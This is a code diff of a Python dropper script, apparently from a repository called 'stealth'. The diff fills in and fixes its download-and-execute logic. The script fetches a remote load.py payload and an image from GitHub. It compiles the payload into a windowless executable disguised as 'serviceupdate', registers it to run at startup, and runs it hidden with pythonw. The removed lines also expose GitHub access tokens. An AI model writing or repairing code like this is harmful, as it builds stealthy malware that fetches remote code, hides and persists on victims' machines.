@@ -13,7 +13,7 @@ exec_path = os.path.join(target_path, "dist", "serviceupdate.exe")
 def download():
     try:        
         if not (os.path.exists(requiremets_path)):
-                requirements_url = ""
+                requirements_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/requirement.txt"
                 response = requests.get(requirements_url)
                 
                 if response.status_code == 200:
@@ -24,7 +24,7 @@ def download():
                 
                          
         if not (os.path.exists(code_path)):
-            code_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/load.py?token=GHSAT0AAAAAADDU7VJKYB4QRQ2WCZGWMIRC2BI63LQ"
+            code_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/load.py"
             code_response = requests.get(code_url)
             
             try:
@@ -36,7 +36,7 @@ def download():
                 pass   
             
             if not (os.path.exists(image_path)):
-                dog_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/DOG.png?token=GHSAT0AAAAAADDU7VJL3LZ4FRA4ET7MXFOS2BI63ZQ"
+                dog_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/DOG.png"
                 dog_response = requests.get(dog_url)
                 
                 try:
@@ -51,7 +51,8 @@ def download():
     
 def creating_exec():
     os.chdir(target_path)
-    subprocess.run(["pyinstaller", "--noconsole", "--onefile", "--name", "serviceupdate" "load.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)
+    if not (os.path.exists(exec_path)):
+        subprocess.run(["pyinstaller", "--noconsole", "--onefile", "--name", "serviceupdate", "load.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)
     
     # copying the image
     exe_img_path = os.path.join(target_path,"dist","DOG.png")
@@ -82,7 +83,7 @@ def add_to_startup():
     
     
 def run_load():
-    subprocess.run([code_path], creationflags=subprocess.CREATE_NO_WINDOW)    
+    subprocess.run(["pythonw", f"{code_path}"], creationflags=subprocess.CREATE_NO_WINDOW)    
     
     
 download()
